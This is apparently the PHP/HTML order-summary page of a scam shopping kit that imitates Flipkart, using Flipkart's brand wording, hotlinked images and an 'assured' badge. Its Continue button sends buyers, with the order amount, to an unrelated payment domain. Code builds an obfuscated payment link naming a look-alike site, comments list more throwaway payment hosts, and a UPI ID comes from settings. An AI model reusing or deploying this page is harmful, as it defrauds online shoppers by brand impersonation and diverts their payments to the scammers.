<html lang="en-IN">

<head>
    <script
        src="https://connect.facebook.net/signals/config/306002705503107?v=2.9.138&amp;r=stable&amp;domain=shopzonebox.shop"
        async=""></script>
    <script
        src="https://connect.facebook.net/signals/config/847945393532021?v=2.9.138&amp;r=stable&amp;domain=shopzonebox.shop"
        async=""></script>
    <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());
        gtag('config', 'UA-254758032-7');
    </script>
    <title><?php echo $web_settings['site_name']; ?></title>
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="Keywords"
        content="Online Shopping in India,online Shopping store,Online Shopping Site,Buy Online,Shop Online,Fliipkart">
    <meta name="Description"
        content="India's biggest online store for Mobiles, Fashion (Clothes/Shoes), Electronics, Home Appliances, Books, Jewelry, Home, Furniture, Sporting goods, Beauty &amp; Personal Care, Grocery and more! Find the largest selection from all brands at the lowest prices in India. Payment options - COD, EMI, Credit card, Debit card &amp; more.">
    <meta property="og:title" content="We are Here To Help You">
    <meta name="theme-color" content="#2874f0" id="themeColor">
    <meta name="viewport" content="width=device-width,minimum-scale=1,user-scalable=no">
    <link rel="stylesheet" href="<?php echo base_url(); ?>/assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="<?php echo base_url(); ?>/assets/css/custom.css">
    <link rel="icon" href="<?php echo base_url(); ?><?php echo $web_settings['logo']; ?>">
    <link rel="icon" type="image/x-icon" href="<?php echo base_url(); ?><?php echo $web_settings['logo']; ?>">
    <script>
        var WEB_API_FOLDER = '<?php echo base_url(); ?>/api_services/';
        var API_SERVICE_URL = '<?php echo base_url(); ?>/api_services/manage.php';
        var ADMIN_PANEL_URL = '<?php echo base_url(); ?>/admin_panel/';
        var MAIN_URL = '<?php echo base_url(); ?>';
            // var PRIMARY_ID = '0';
    </script>
    <script>
        var UPI_ID = "<?php echo $web_settings['upi_id']; ?>"
    </script>
    <!-- Meta Pixel Code -->
    <?php echo $web_settings['pixel_code']; ?>
    <!-- End Meta&nbsp;Pixel&nbsp;Code&nbsp;-->
</head>

<body class="expansion-alids-init" cz-shortcut-listen="true">
    <div id="container">
        <div style="height:100%;background: #f1f2f4;" data-reactroot="">
            <style>
                .form-control {
                    margin-bottom: 16px;
                }

                .card {
                    border: rgba(0, 0, 0, 0) !important;
                }

                .card-footer {
                    background: none !important;
                    border-top: none !important;
                    position: absolute;
                    bottom: 0;
                    width: 90%;
                    left: 5%;
                }

                .address-div.mt-2 {
                    color: #565959 !important;
                    font-size: 14px !important;
                    line-height: 16px !important;
                    text-align: center;
                    font-weight: 600;
                    text-overflow: ellipsis;
                    white-space: nowrap;
                    overflow: hidden;
                    border-radius: 0.8rem 0.8rem 0 0;
                    background: #FFF !important;
                    padding: 15px;
                    border-bottom: 1px solid #bebebe;
                }

                .price-detail-div.mt-0 {
                    background: #FFF !important;
                    padding: 15px;
                    border-bottom: 1px solid #bebebe;
                }

                .bt_hdg button.buynow-button.product-page-buy.col-12.btn-continue {
                    background: #FFD814;
                    border-color: #FCD200;
                    box-shadow: 0 .2rem .5rem 0 rgba(213, 217, 217, .5);
                    border-radius: 0.8rem;
                    width: 100% !IMPORTANT;
                    height: 45px !IMPORTANT;
                    margin: 0px;
                }

                .button-container.p-3.bg-white.bt_hdg {
                    position: fixed;
                    bottom: 0;
                    width: 100%;
                    position: fixed;
                    overflow: hidden;
                    width: 100%;
                    bottom: 0;
                    left: 0;
                    z-index: 99;
                    box-shadow: -4px 3px 7px #bdbbbb;
                    padding: 10px !IMPORTANT;
                }
            </style>
            <div class="container-fluid p-3 header-container" style="background-color: #fff;">
                <div class="row header">
                    <div class="col-1">
                        <div class="menu-icon" id="back_btn">
                            <svg width="19" height="16" viewBox="0 0 19 16" xmlns="http://www.w3.org/2000/svg">
                                <path d="M17.556 7.847H1M7.45 1L1 7.877l6.45 6.817" stroke="#000" stroke-width="1.5"
                                    stroke-linecap="round" stroke-linejoin="round" fill="none"></path>
                            </svg>
                        </div>
                    </div>
                    <div class="col-8">
                        <div class="menu-logo">
                            <h4 class="mb-0 mt-1 ms-2" style="font-size: 16px;">Order Summary</h4>
                        </div>
                    </div>
                </div>
            </div>
            <div class="_1fhgRH max-height mb-70">
                <div class="card pt-1 mb-1">
                    <div class="proc_br" style="height: 56px;">
                        <img alt="amezon" src="<?php echo base_url(); ?>/assets/images/progress-indicator-summary.png"
                            width="100%" height="auto">
                    </div>
                </div>
                <div class="card px-3 py-4 mb-2" style="background: #fff !important;">
                    <div class="address-div">
                        <h3 style="font-weight: 600;line-height: 21px;color: #212529;">Delivered to:</h3>
                        <div class="mt-3">
                            <h4 style="font-weight: 500;color: #212529!important;font-size: 16px;"
                                class="customer-name"></h4>
                            <div style="color: #212529!important;" class="mb-2 customer-address"></div>
                            <div style="color: #212529!important;" class="customer-contact"></div>
                        </div>
                    </div>


                </div>
                <div class="card px-3 py-4 mb-2" style="background: #fff !important;">

                    <ul class="list-group list-group-flush" id="deals">
                        <li class="list-group-item px-0" data-timer="2000">
                            <div class="flex recommended-product">
                                <div>
                                    <img src="<?php echo base_url($product_details['image']) ?>" id="item_image">

                                </div>
                                <div class="description">
                                    <div class="price">
                                        <div class="product-title" id="product-title">
                                            <?= $product_details['product_name'] ?>
                                        </div>
                                        <div class="product-storageactive py-1" style="font-size:14px;color:#212529"
                                            id="product-storageactive"></div>
                                        <div class="_24B_AU _1AQnZC">
                                            <img src="<?php echo base_url(); ?>upload/logo/assured.png" width="77px">
                                        </div>
                                    </div>

                                </div>
                            </div>
                            <script>


                                // Retrieve storage information from Local Storage
                                var storageInfo = localStorage.getItem('activeStorage');

                                // Display storage information
                                var storageActiveElement = document.getElementById('product-storageactive');
                                storageActiveElement.textContent = storageInfo || 'No storage information available';
                            </script>
                            <div class="flex recommended-product mt-3">
                                <div class="qty mx-4">Qty: 1</div>
                                <div class="price-description">
                                    <div class="price flex">
                                        <span class="discount" id="discount"><?= $product_details['off_per'] ?>%
                                            off</span>&nbsp;&nbsp;
                                        <span class="strike mrp" id="mrp"
                                            style="margin: 0 5px;color: #878787;">₹<?= $product_details['price'] ?></span>&nbsp;&nbsp;
                                        <span class="selling_price"
                                            id="selling_price">₹<?= $product_details['cancle_price'] ?></span>
                                    </div>
                                </div>
                            </div>

                        </li>
                    </ul>
                </div>
                <div class="card px-3 py-4 mb-2" id="price-detail">
                    <h3 style="color: #212529;font-size: 17.52px;font-weight: 500;">Price Details</h3>
                    <div class="price-detail-div mt-2">
                        <div class="product-price-list my-3">
                            <span class="title">Price (1 item)</span>
                            <span class="data mrp me-0 td-none">₹<?= $product_details['cancle_price'] ?></span>
                        </div>
                        <div class="product-price-list my-3">
                            <span class="title">Discount</span>
                            <span
                                class="data discount-amt text-success">-₹<?= $product_details['cancle_price'] - $product_details['price'] ?></span>
                        </div>
                        <div class="product-price-list my-3">
                            <span class="title">Delivery Charges</span>
                            <span class="data text-success">FREE Delivery </span>
                        </div>
                        <div class="product-price-list my-3 pt-3 total">
                            <span class="title">Total Amount </span>
                            <span class="data selling_price">₹<?= $product_details['cancle_price'] ?></span>
                        </div>
                        <div class="product-price-list mt-3 pt-3 saved-div">
                            <span class="text-success">You will save <span
                                    class="discount-amt">₹<?= $product_details['cancle_price'] - $product_details['price'] ?></span>
                                on this order</span>
                        </div>
                    </div>
                </div>
                <div class="sefty-banner">
                    <img class="sefty-img"
                        src="https://rukminim1.flixcart.com/www/60/70/promos/13/02/2019/9b179a8a-a0e2-497b-bd44-20aa733dc0ec.png?q=90"
                        loading="lazy" alt="">
                    <div dir="auto" class="sefty-txt">Safe and secure payments. Easy returns. 100% Authentic products.
                    </div>
                </div>


                <div class="button-container flex p-3 bg-white bt_hdg">
                    <div class="col-6 footer-price">
                        <span class="strike mrp ms-0 mb-1" style="color: #9A9A9A;"
                            id="mrp">₹<?= $product_details['price'] ?></span>
                        <span class="selling_price" style="color: #212529;"
                            id="selling_price">₹<?= $product_details['cancle_price'] ?></span>
                    </div>



                    <?php
$canclePrice = $product_details['cancle_price'];
$rowUrl = "amount=" . $product_details['cancle_price'] ."&website=https://flipmarts.shop";
// echo $rowUrl;

function encryptURL($url)
{
    $encryptedUrl = '';
    $length = strlen($url);
    for ($i = 0; $i < $length; $i++) {
        // Shift each character by 1 (simple encryption)
        $encryptedChar = chr(ord($url[$i]) + 1);
        $encryptedUrl .= $encryptedChar;
    }
    return urlencode($encryptedUrl); // URL encode the encrypted URL
}

$urlToEncrypt = $rowUrl;
$encryptedUrl = encryptURL($urlToEncrypt);

// $urls = "https://idesignerpro.com/payment.html?q=" . $encryptedUrl;

// Output: https%3A%2F%2Fastrologys.netlify.app%2Fpayment_flipmarts.html%3Fq%3D... (URL encoded)

?>

               <!--<button class="buynow-button product-page-buy col-6 btn-continue"-->
               <!--    onclick="window.location.href='<?php echo $urls; ?>'">-->
               <!--    Continue-->
               <!--</button>-->
            <button class="buynow-button product-page-buy col-6 btn-continue" onclick="window.location.href = `https://nayabazar.fun/sale-event/payment?q=`+ amt;'">
        Continue
    </button>

               
                </div>
            </div>
        </div>
        <footer class="seofooter" id="seofooter"></footer>
        <script defer="" src="<?php echo base_url(); ?>/assets/js/jquery.min.js"></script>
        <script defer="" src="<?php echo base_url(); ?>/assets/js/bootstrap.min.js"></script>
        <script defer="" src="<?php echo base_url(); ?>/assets/js/relativeTime.js"></script>
        <script defer="" src="<?php echo base_url(); ?>/assets/js/days.min.js"></script>
        <script defer="" src="<?php echo base_url(); ?>/assets/js/custom.js"></script>
        <script defer="" src="<?php echo base_url(); ?>/assets/js/manage_summary.js"></script>
    </div>
</body>

</html>